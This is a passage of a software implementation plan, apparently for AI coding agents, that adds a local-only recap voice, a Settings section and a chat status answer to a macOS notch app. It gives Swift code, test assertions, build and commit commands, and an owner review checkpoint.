It compiles the whole app (about two minutes) and ends `wrote …`. Open the PNG with the file reader. Expected: four islands stacked. (1) `Welcome back` and one recap sentence on two lines with an `OK` button; (2) `Going in circles`, `Claude Code has run the same step 4 times.`, `Not now` and `Show me`; (3) `Waiting for you`, `Claude Code is still waiting for your OK.`, the same two buttons; (4) a recap of four agents with **no title, three rows** (`While you were away, Antigravity in api …`, `Gemini CLI in docs …`, `+2 more`) and `OK`. Each has a small × at the top right and the big cat at the left; **no card's content leaves the rounded card**. If one does, stop and report.

- [ ] **Step 8: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the .sidekick row: a note opens the island the way a finished task does and goes by itself

A row of its own, hosted only where the user is just looking and never while they type; OK, x and Not now count as a dismissal, Show me does not; the pill's routes to an agent's app move into AgentTarget and are shared. No window of its own.

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickView.swift NotchBuddy/Sources/App/AgentTarget.swift NotchBuddy/Sources/App/IslandTypes.swift NotchBuddy/Sources/App/IslandViewContent.swift NotchBuddy/Sources/App/Sidekick.swift NotchBuddy/Sources/App/AppDelegate.swift NotchBuddy/Sources/App/IslandWindowController.swift scripts/render-sidekick.sh scripts/render-sidekick.swift tests/SidekickWiringTests.swift tests/HookOriginWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 14: The local voice in the app

**Agent:** `nm-implementer` (Haiku 5.5, high).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickVoiceApp.swift`
- Modify: `NotchBuddy/Sources/App/Sidekick.swift`, `tests/SidekickWiringTests.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 8's `SidekickVoiceLocal.choice(localReady:lastUsedLocal:appleReady:)` and `.nicerLine(lines:facts:candidate:provider:timeoutMs:)`; Task 9's `SidekickEngine.Env.polish`; `AIService.shared` (`localReady()`, `target(_:)`, `factory()`), `AppState.shared` (`lastUsedLocal`, `appleStatus`), `AIMessages.targetLabel(_:)`.
- Produces: `SidekickVoiceApp` (`candidate()`, `foundLabel()`, `nicer(lines:facts:)`), `env.polish` wired in `Sidekick`.

A recap's words may be offered a nicer sentence by a model **on this computer**, in the background, after the template is already on the island. The app's side only reads what the app has found (the servers on `127.0.0.1`, `::1` or `localhost` and Apple on-device) and builds the one provider the voice may ask; **it never goes through the chat's Auto choice** and the AI layer gets no feature of its own for it (`AIFeature` stays `chat, files`), because Auto could pick a cloud model. Nothing about a recap or a status answer reaches a model that is not on this computer. With the switch off ("Nicer wording from a local model"), the engine makes no request at all.

- [ ] **Step 1: Write the failing pins**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("AgentTarget brings an app to the front and does nothing else: no paste, no key, no typing", !target.contains("CGEvent") && !target.contains("NSPasteboard") && !target.contains("keyDown") && !target.contains("AppleScript") && !target.contains("NSAppleScript"))

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift", "SidekickView.swift"]
        for f in files {
            let t = source(f)
```

Replace with:

```swift
        CT.checkTrue("AgentTarget brings an app to the front and does nothing else: no paste, no key, no typing", !target.contains("CGEvent") && !target.contains("NSPasteboard") && !target.contains("keyDown") && !target.contains("AppleScript") && !target.contains("NSAppleScript"))

        CT.section("the local voice: a model on this computer or none, never the chat's Auto choice")
        let voiceApp = source("SidekickVoiceApp.swift"), voiceLocal = source("SidekickVoiceLocal.swift")
        CT.checkTrue("the app's side asks the pure rule for the model and the request, and builds one provider", count("SidekickVoiceLocal.choice(", in: voiceApp) == 1 && count("SidekickVoiceLocal.nicerLine(", in: voiceApp) == 1 && count("AIService.shared.factory()", in: voiceApp) == 1)
        CT.checkTrue("it never goes through a feature's route: no Auto, no feature, no router plan, no cloud keys", !voiceApp.contains("routeInput") && !voiceApp.contains("resolve(") && !voiceApp.contains("ModelRouter.plan") && !voiceApp.contains("AIFeature") && !voiceApp.contains("cloudKeys") && !voiceApp.contains("preferredCloud") && !voiceApp.contains("claudeCode"))
        CT.checkTrue("and the AI layer has no feature for the cats (F1 adds none: Auto would pick a cloud model for it)", !source("AI/Core/ModelRouter.swift").contains("case cats") && source("AI/Core/ModelRouter.swift").contains("case chat, files"))
        CT.checkTrue("the request is made only for a local candidate, twice checked, and takes the provider from outside", voiceLocal.contains("c.placement == .local") && voiceLocal.contains("model.placement == .local") && voiceLocal.contains("provider: @Sendable (ChatTarget) -> any ModelProvider"))
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift", "SidekickView.swift", "SidekickVoiceApp.swift", "SidekickVoice.swift", "SidekickVoiceLocal.swift"]
        for f in files {
            let t = source(f)
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: the pins of the voice's app side (`✗ the app's side asks the pure rule…`, `✗ it never goes through a feature's route…`, the engine given the voice) and `N test(s) failed.`.

- [ ] **Step 3: Write the app's side and give the engine the voice**

**Create `NotchBuddy/Sources/App/SidekickVoiceApp.swift`**

```swift
import Foundation

// The local voice in the app: which model it would use and the glue to the AI layer. The rules (the sanity check, the one request, the choice of a LOCAL model) are `SidekickVoice` and
// `SidekickVoiceLocal`, tested against fake providers; this file only reads what the app has found (the servers on this computer, Apple on-device) and builds the provider for the one model
// the voice may ask. It never goes through the chat's Auto choice, which could pick a cloud model, and the AI layer gets no feature of its own for it: a model that is not on this
// computer is not considered, and nothing about a recap or a status answer is ever sent to one.

@MainActor
enum SidekickVoiceApp {
    /// The model on this computer the voice would use now: the last used local one, else the first ready one, else Apple on-device; nil when there is none.
    static func candidate() -> LocalCandidate? {
        let app = AppState.shared
        return SidekickVoiceLocal.choice(localReady: AIService.shared.localReady(), lastUsedLocal: app.lastUsedLocal, appleReady: app.appleStatus == .ready)
    }

    /// The line under the Settings switch: "Local · qwen3.5:2b", or nil when no model on this computer was found.
    static func foundLabel() -> String? {
        candidate().map { AIMessages.targetLabel(AIService.shared.target($0)) }
    }

    /// A nicer sentence for the template `lines` (made from `facts`), or nil, in at most six seconds. The request goes to a model on this computer or to none.
    static func nicer(lines: [String], facts: [SKFacts]) async -> String? {
        guard let c = candidate() else { return nil }
        let factory = AIService.shared.factory()
        return await SidekickVoiceLocal.nicerLine(lines: lines, facts: facts, candidate: c, provider: { factory.make($0) })
    }
}
```

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
        env.canHost = { let app = AppState.shared; return SidekickHost.canHost(expanded: app.mode == .expanded, view: app.view.rawValue) }
        env.typing = { inputs.typing() }
        env.pointerOver = { inputs.pointerOver() }
        // A note opens the island on its own row the way a finished task does (`.hookExpand`): no window of its own, and never over a card, the chat or Settings (`canHost`).
```

Replace with:

```swift
        env.canHost = { let app = AppState.shared; return SidekickHost.canHost(expanded: app.mode == .expanded, view: app.view.rawValue) }
        env.typing = { inputs.typing() }
        // A nicer sentence for a recap, from a model on this computer if there is one (never the chat's Auto choice, which could be a cloud model). The template is shown first and stands otherwise.
        env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: "\n"), facts: note.facts) }
        env.pointerOver = { inputs.pointerOver() }
        // A note opens the island on its own row the way a finished task does (`.hookExpand`): no window of its own, and never over a card, the chat or Settings (`canHost`).
```

- [ ] **Step 4: Run the pins and the build**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | tail -1; bash scripts/test-sidekick-voice.sh 2>&1 | tail -1`
Expected: two lines, each `All tests passed.`

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the local voice in the app: a model on this computer, never the chat's Auto choice

A recap's words may be offered a nicer sentence by a local server or Apple on-device, after the template is shown; no cloud model is ever asked and the AI layer gets no feature for it.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickVoiceApp.swift NotchBuddy/Sources/App/Sidekick.swift tests/SidekickWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 15: Settings → Sidekick

**Agent:** `nm-implementer` (Haiku 5.5, high).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickSettingsView.swift`
- Modify: `NotchBuddy/Sources/App/SettingsView.swift`, `scripts/render-sidekick.swift`, `scripts/render-sidekick.sh`, `tests/SidekickWiringTests.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 5's `SidekickStore` (`settings`, `setOn`, `setLocal`, `unmute`) and `SidekickSettings` (`isMuted`, `kinds`), Task 14's `SidekickVoiceApp.foundLabel()`, `SettingsSidebarRow` and the `sectionTitle` / `sectionContent` switches of `SettingsView`.
- Produces: `SidekickSettingsView(store:found:)` (plain values, so a script can draw it), `SidekickSettingsSection`, the sidebar row `Sidekick` (tag `sidekick`), `render-sidekick.sh --settings-out`.

A new **Sidekick** section in Settings, in the existing style (a `GroupBox` per topic, a switch, grey 11 pt notes); nothing existing is restyled, and `SettingsView.swift` gains exactly three lines. The rows are the spec's: **Recaps and nudges** (the master switch, on by default: off means no recap and no stuck nudge), **Nicer wording from a local model** (on by default, with one grey line under it, `Found: Local · qwen3.5:2b` or `No local model found`; off means only the templates), **Muted notes** (one row for each muted kind with an **Unmute** button: Away recaps, Repeated steps, Repeated errors, Waiting for your OK, Gone quiet; `Nothing is muted` when none is) and the note `Permission explanations are always on.` The permission line and the risk badge have no switch.

- [ ] **Step 1: Write the failing pins**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift", "SidekickView.swift", "SidekickVoiceApp.swift", "SidekickVoice.swift", "SidekickVoiceLocal.swift"]
```

Replace with:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("Settings → Sidekick: a new section in the existing style, and nothing existing is restyled")
        let settingsView = source("SettingsView.swift"), sidekickSettings = source("SidekickSettingsView.swift")
        CT.checkTrue("the sidebar gets one row, the title and the content one line each, and no other line of Settings changes", count("sidekick", in: settingsView) == 3 && settingsView.contains("SettingsSidebarRow(title: \"Sidekick\",     icon: \"sparkles\",                          color: \"#E8B84A\").tag(\"sidekick\")") && settingsView.contains("case \"sidekick\":     return \"Sidekick\"") && settingsView.contains("case \"sidekick\":     SidekickSettingsSection()"))
        CT.checkTrue("the rows are the spec's: the master switch, the local voice with what was found, the muted kinds with Unmute, and the note that permission explanations are always on", sidekickSettings.contains("Toggle(\"Recaps and nudges\"") && sidekickSettings.contains("Toggle(\"Nicer wording from a local model\"") && sidekickSettings.contains("\"Found: \\($0)\"") && sidekickSettings.contains("\"No local model found\"") && sidekickSettings.contains("\"Nothing is muted\"") && sidekickSettings.contains("Button(\"Unmute\") { store.unmute(row.kind) }") && sidekickSettings.contains("Permission explanations are always on."))
        CT.checkTrue("the five kinds are listed by the names the spec gives", ["Away recaps", "Repeated steps", "Repeated errors", "Waiting for your OK", "Gone quiet"].allSatisfy { sidekickSettings.contains("\"\($0)\"") })
        CT.checkTrue("every change goes through the store, and the permission line and the badge have no switch here", sidekickSettings.contains("store.setOn($0)") && sidekickSettings.contains("store.setLocal($0)") && !sidekickSettings.contains("risk") && !sidekickSettings.contains("badge"))

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift", "SidekickEngine.swift", "PresenceMonitor.swift", "SidekickView.swift", "SidekickVoiceApp.swift", "SidekickVoice.swift", "SidekickVoiceLocal.swift"]
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: the four pins of the Settings section and `N test(s) failed.`.

- [ ] **Step 3: Write the section and add its three lines to Settings**

**Create `NotchBuddy/Sources/App/SidekickSettingsView.swift`**

```swift
import SwiftUI

// Settings → Sidekick: the master switch, the local-voice switch and the muted notes, built from the rows Settings already has (a GroupBox per topic, a switch, grey 11 pt notes): no existing row
// changes. Everything it shows is `SidekickStore.settings`, and every change goes through the store, which cleans it and saves it. The view takes plain values so the render script can draw it
// without the app (`SidekickSettingsSection` below reads the one thing only the app knows: which local model was found).

struct SidekickSettingsView: View {
    @ObservedObject var store: SidekickStore
    /// The local model the voice would use ("Local · qwen3.5:2b"), or nil when none was found.
    let found: String?

    /// The five kinds of note, as the user knows them.
    static let kindNames: [(kind: String, label: String)] = [
        ("recap", "Away recaps"), ("stuck.loop", "Repeated steps"), ("stuck.errors", "Repeated errors"), ("stuck.waiting", "Waiting for your OK"), ("stuck.silent", "Gone quiet"),
    ]

    var body: some View {
        VStack(alignment: .leading, spacing: 18) {
            GroupBox("Notes") {
                VStack(alignment: .leading, spacing: 6) {
                    Toggle("Recaps and nudges", isOn: Binding(get: { store.settings.on }, set: { store.setOn($0) }))
                    Text("A short recap when you come back and an agent did something, and a nudge when an agent looks stuck. They show only in the island, never over your work, and never while you type.")
                        .font(.system(size: 11)).foregroundColor(.secondary)
                    Text("Permission explanations are always on.")
                        .font(.system(size: 11)).foregroundColor(.secondary)
                }
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding(6)
            }
            GroupBox("Wording") {
                VStack(alignment: .leading, spacing: 6) {
                    Toggle("Nicer wording from a local model", isOn: Binding(get: { store.settings.local }, set: { store.setLocal($0) }))
                    Text(found.map { "Found: \($0)" } ?? "No local model found")
                        .font(.system(size: 11)).foregroundColor(.secondary)
                    Text("Only a model on this computer is ever asked, and only with the words of the note. Off means the plain words.")
                        .font(.system(size: 11)).foregroundColor(.secondary)
                }
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding(6)
            }
            GroupBox("Muted notes") {
                VStack(alignment: .leading, spacing: 8) {
                    let muted = Self.kindNames.filter { store.settings.isMuted($0.kind) }
                    if muted.isEmpty {
                        Text("Nothing is muted").font(.system(size: 12)).foregroundColor(.secondary)
                    } else {
                        ForEach(muted, id: \.kind) { row in
                            HStack {
                                Text(row.label).frame(width: 150, alignment: .leading)
                                Button("Unmute") { store.unmute(row.kind) }
                                Spacer()
                            }
                        }
                        Text("A note you dismiss twice is muted until you unmute it here.")
                            .font(.system(size: 11)).foregroundColor(.secondary)
                    }
                }
                .frame(maxWidth: .infinity, alignment: .leading)
                .padding(6)
            }
        }
    }
}

/// Settings → Sidekick in the app: the view with the model the voice would use, read again whenever the servers on this computer change.
struct SidekickSettingsSection: View {
    @ObservedObject private var store = SidekickStore.shared
    @ObservedObject private var app = AppState.shared

    var body: some View {
        SidekickSettingsView(store: store, found: SidekickVoiceApp.foundLabel())
    }
}
```

**Edit `NotchBuddy/Sources/App/SettingsView.swift`** (the find text occurs exactly once)

Find:

```swift
                        SettingsSidebarRow(title: "Shortcuts",    icon: "keyboard.fill",                     color: "#2FB5A6").tag("shortcuts")
                        SettingsSidebarRow(title: "Cat",          icon: "pawprint.fill",                     color: "#D9A066").tag("cat")
                    }
                    .listStyle(.sidebar)
```

Replace with:

```swift
                        SettingsSidebarRow(title: "Shortcuts",    icon: "keyboard.fill",                     color: "#2FB5A6").tag("shortcuts")
                        SettingsSidebarRow(title: "Cat",          icon: "pawprint.fill",                     color: "#D9A066").tag("cat")
                        SettingsSidebarRow(title: "Sidekick",     icon: "sparkles",                          color: "#E8B84A").tag("sidekick")
                    }
                    .listStyle(.sidebar)
```

**Edit `NotchBuddy/Sources/App/SettingsView.swift`** (the find text occurs exactly once)

Find:

```swift
        case "shortcuts":    return "Shortcuts"
        case "cat":          return "Cat"
        default:             return "General"
        }
```

Replace with:

```swift
        case "shortcuts":    return "Shortcuts"
        case "cat":          return "Cat"
        case "sidekick":     return "Sidekick"
        default:             return "General"
        }
```

**Edit `NotchBuddy/Sources/App/SettingsView.swift`** (the find text occurs exactly once)

Find:

```swift
        case "shortcuts":    ShortcutsSettingsView()
        case "cat":          CatSettingsSection()
        default:             generalSection
        }
```

Replace with:

```swift
        case "shortcuts":    ShortcutsSettingsView()
        case "cat":          CatSettingsSection()
        case "sidekick":     SidekickSettingsSection()
        default:             generalSection
        }
```

- [ ] **Step 4: Let the render script draw the section**

**Edit `scripts/render-sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
// in, 42 pt down, 98 pt high, and the big cat beside it, drawn by the real renderer where the island puts it). The three notes the owner sees: the recap after a lock, the nudge for a loop, and the
// nudge for a request nobody is looking at.
//   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2]
// Run it through the .sh: it compiles the whole app but NotchBuddyApp.swift, and runs in a home folder of its own.

```

Replace with:

```swift
// in, 42 pt down, 98 pt high, and the big cat beside it, drawn by the real renderer where the island puts it). The three notes the owner sees: the recap after a lock, the nudge for a loop, and the
// nudge for a request nobody is looking at.
//   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2] [--settings-out sidekick-settings.png]
// --settings-out also draws Settings → Sidekick (SidekickSettingsView) on a store of its own, with two kinds muted and a local model "found". The system controls (switches, group boxes, buttons) may
// come out blank in an offscreen bitmap; the text and the layout do not.
// Run it through the .sh: it compiles the whole app but NotchBuddyApp.swift, and runs in a home folder of its own.

```

**Edit `scripts/render-sidekick.swift`** (the find text occurs exactly once)

Find:

```swift

    @MainActor static func main() {
        var out = "sidekick-notes.png", scale = 2.0
        var it = CommandLine.arguments.dropFirst().makeIterator()
        while let k = it.next() {
```

Replace with:

```swift

    @MainActor static func main() {
        var out = "sidekick-notes.png", scale = 2.0, settingsOut = ""
        var it = CommandLine.arguments.dropFirst().makeIterator()
        while let k = it.next() {
```

**Edit `scripts/render-sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
            case "--out": out = it.next() ?? out
            case "--scale": scale = Double(it.next() ?? "") ?? scale
            default: FileHandle.standardError.write(Data("unknown argument \(k)\n".utf8)); exit(2)
            }
```

Replace with:

```swift
            case "--out": out = it.next() ?? out
            case "--scale": scale = Double(it.next() ?? "") ?? scale
            case "--settings-out": settingsOut = it.next() ?? settingsOut
            default: FileHandle.standardError.write(Data("unknown argument \(k)\n".utf8)); exit(2)
            }
```

**Edit `scripts/render-sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
        try! png.write(to: URL(fileURLWithPath: out))
        print("wrote \(out)")
    }
}
```

Replace with:

```swift
        try! png.write(to: URL(fileURLWithPath: out))
        print("wrote \(out)")
        if !settingsOut.isEmpty { renderSettings(to: settingsOut) }
    }

    /// Settings → Sidekick as the app draws it: a store on a dictionary with the recap and the waiting nudge muted, and a local model found.
    @MainActor static func renderSettings(to path: String) {
        let store = SidekickStore(backing: DictBacking())
        for k in ["recap", "stuck.waiting"] { store.dismiss(k); store.dismiss(k) }
        let width = 520.0, height = 470.0
        let host = NSHostingView(rootView: SidekickSettingsView(store: store, found: "Local \u{00B7} qwen3.5:2b").padding(20).frame(width: width, height: height, alignment: .topLeading))
        host.frame = NSRect(x: 0, y: 0, width: width, height: height)
        let win = NSWindow(contentRect: host.frame, styleMask: [.titled], backing: .buffered, defer: false)
        win.appearance = NSAppearance(named: .darkAqua)
        win.backgroundColor = .windowBackgroundColor
        win.contentView = host
        host.layoutSubtreeIfNeeded()
        RunLoop.current.run(until: Date().addingTimeInterval(0.8))
        host.layoutSubtreeIfNeeded()
        guard let rep = host.bitmapImageRepForCachingDisplay(in: host.bounds) else { exit(1) }
        host.cacheDisplay(in: host.bounds, to: rep)
        guard let shot = rep.cgImage,
              let cg = CGContext(data: nil, width: shot.width, height: shot.height, bitsPerComponent: 8, bytesPerRow: 0, space: CGColorSpace(name: CGColorSpace.sRGB)!, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { exit(1) }
        cg.setFillColor(CGColor(srgbRed: 0.16, green: 0.16, blue: 0.17, alpha: 1))
        cg.fill(CGRect(x: 0, y: 0, width: shot.width, height: shot.height))
        cg.draw(shot, in: CGRect(x: 0, y: 0, width: shot.width, height: shot.height))
        guard let flat = cg.makeImage(), let png = NSBitmapImageRep(cgImage: flat).representation(using: .png, properties: [:]) else { exit(1) }
        try! png.write(to: URL(fileURLWithPath: path))
        print("wrote \(path)")
    }
}
```

**Edit `scripts/render-sidekick.sh`** (the find text occurs exactly once)

Find:

```bash
#!/usr/bin/env bash
# Draws the sidekick's notes (SidekickView) with the big cat beside them into a PNG, without launching NotchMeow (see scripts/render-sidekick.swift): a recap after a lock, a nudge for a loop and
# a nudge for a request nobody is looking at, each made by the real engine on a clock by hand.
#   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2]
# SidekickView reads the app's AppState, so this script compiles every file of the app except NotchBuddyApp.swift (the app's own @main): about two minutes. AppState is made (it reads UserDefaults,
# which for this tool is a domain of its own, and ~/.claude/settings.json, which is in the empty home folder below: scripts/render-home-guard.sh points Foundation at that folder and kills the tool
```

Replace with:

```bash
#!/usr/bin/env bash
# Draws the sidekick's notes (SidekickView) with the big cat beside them into a PNG, without launching NotchMeow (see scripts/render-sidekick.swift): a recap after a lock, a nudge for a loop, a
# nudge for a request nobody is looking at and a recap of four agents, each made by the real engine on a clock by hand; and, with --settings-out, Settings → Sidekick.
#   bash scripts/render-sidekick.sh --out sidekick-notes.png [--scale 2] [--settings-out sidekick-settings.png]
# SidekickView reads the app's AppState, so this script compiles every file of the app except NotchBuddyApp.swift (the app's own @main): about two minutes. AppState is made (it reads UserDefaults,
# which for this tool is a domain of its own, and ~/.claude/settings.json, which is in the empty home folder below: scripts/render-home-guard.sh points Foundation at that folder and kills the tool
```

- [ ] **Step 5: Run the pins and the build**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | tail -1`
Expected: `All tests passed.`

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 6: Draw the section and look at it**

```bash
bash scripts/render-sidekick.sh --out "${TMPDIR:-/tmp}/f1-mac-1/sidekick-notes.png" --settings-out "${TMPDIR:-/tmp}/f1-mac-1/sidekick-settings.png"
```

Two lines, `wrote …` each (about two minutes). Open `sidekick-settings.png`. Expected: three groups, **Notes** (the switch `Recaps and nudges`, the grey sentence, `Permission explanations are always on.`), **Wording** (`Nicer wording from a local model`, `Found: Local · qwen3.5:2b`, the grey sentence) and **Muted notes** (`Away recaps` and `Waiting for your OK`, each with an `Unmute` button, and the grey sentence). The system controls (switches, group boxes) may come out blank in an offscreen bitmap; the text and the layout do not (Settings → Cat's script says the same).

- [ ] **Step 7: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): Settings → Sidekick: the switch, the local voice and Unmute

A new section in the existing style; three added lines in SettingsView. The permission line and the badge have no switch.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickSettingsView.swift NotchBuddy/Sources/App/SettingsView.swift scripts/render-sidekick.swift scripts/render-sidekick.sh tests/SidekickWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 16: Owner checkpoint 1: the card with its line and badge, the note rows, and Settings → Sidekick (as pictures)

**Agent:** the session, then the main session and the owner. No code and no commit. Tasks 1 to 15 are done; this stops the run so the owner sees what was built before the chat, the drop and the privacy work are added.

- [ ] **Step 1: Collect the pictures**

```bash
mkdir -p .claude/checkpoints/f1-mac
P="${TMPDIR:-/tmp}/f1-mac-1"
cp "$P"/approval-high.png "$P"/approval-medium.png "$P"/approval-plain.png "$P"/sidekick-notes.png "$P"/sidekick-settings.png .claude/checkpoints/f1-mac/
ls -1 .claude/checkpoints/f1-mac
```

Expected: the five names (`.claude/checkpoints/` is gitignored; nothing is committed). If Task 11's or Task 15's pictures are older than the last edit of the files they draw, draw them again first (`scripts/render-approval-card.sh`, `scripts/render-sidekick.sh --settings-out …`).

- [ ] **Step 2: Run every sidekick test once more**

```bash
for f in scripts/test-sidekick-*.sh; do printf '%-44s' "$f"; bash "$f" 2>&1 | tail -1; done
```

Expected: eleven lines, the first ten ending `All tests passed.` and `scripts/test-sidekick-contract.sh` ending `✓ two generator runs write identical bytes`.

- [ ] **Step 3: Stop and report to the main session**

Report: the commits; the test lines of Step 2; the Debug build line; the paths of the five PNGs and one sentence on each (what it shows); and anything not settled. Then **stop**: the owner looks at the pictures, and the main session sends the reply before Task 17 starts.

**What the owner looks at:**
1. `approval-high.png`: the card is as it shipped plus one grey sentence under the command (`Deletes build and everything inside it.`) and a small orange `High risk` capsule at the right end of the first row. All three rows and the buttons are inside the card.
2. `approval-medium.png`: the grey sentence, no badge. `approval-plain.png`: the card exactly as it shipped.
3. `sidekick-notes.png`: a recap, a loop nudge, a waiting nudge and a four-agent recap, in the island's own card with the cat, `OK` or `Not now` and `Show me`, and a small ×. The wording ("Welcome back", "Going in circles", "Waiting for you") is the owner's to change.
4. `sidekick-settings.png`: the three groups and the muted rows with `Unmute`.

---

### Task 17: "What's Claude doing?" in the chat, answered on this Mac

**Agent:** `nm-implementer` (Haiku 5.5, high).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickChat.swift`
- Modify: `NotchBuddy/Sources/App/ClaudeService.swift` (`send`), `NotchBuddy/Sources/App/IslandViewContent.swift` (the chat's empty state), `tests/SidekickWiringTests.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 9's `SidekickEngine.status(for:)`, Task 4's `SidekickRecap.matchStatusQuestion` (through the engine), Task 14's `SidekickVoiceApp.nicer`, `ChatMessage` (`role`, `content`, `caption`), `AppState.chatHistory`, `ClaudeService.send(query:context:state:)`, `PromptView`.
- Produces: `SidekickChat` (`caption`, `chipText`, `answer(_:state:engine:)`) and `SidekickStatusChip`.

The question is answered **on this Mac, from the ledger, and never added to a conversation.** `ClaudeService.send` checks the matcher **first** and returns before a provider is chosen, a conversation is touched or a typing indicator is shown: the question and the answer are appended only to the chat's list on screen (`AppState.chatHistory`, which no provider ever reads: the model's history is `ClaudeService.conversation`, which this path never reaches), and the answer's caption reads `From NotchMeow, on this Mac`. A dropped file's context is not reset (so the next real question still carries the file), and if the chat is on a cloud model, **nothing about the question or its answer is sent anywhere.** Only a **whole short message** is the question (`what's claude doing`, `status`, `what are the agents doing`, with an optional agent name); a real question that merely contains the words goes to the model as usual. With nothing running, the answer is `No agent is running right now.` (or `Claude Code is not running right now.` for one agent). A chip with the question sits in the chat's empty state; the local voice may reword the answer, by the same rules as a recap (a model on this computer, at most six seconds, the template first).

- [ ] **Step 1: Write the failing pins**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("Settings → Sidekick: a new section in the existing style, and nothing existing is restyled")
        let settingsView = source("SettingsView.swift"), sidekickSettings = source("SidekickSettingsView.swift")
```

Replace with:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("\"What's Claude doing?\": answered on this Mac, before a provider is chosen, and never added to a conversation")
        let claude = source("ClaudeService.swift"), chat = source("SidekickChat.swift")
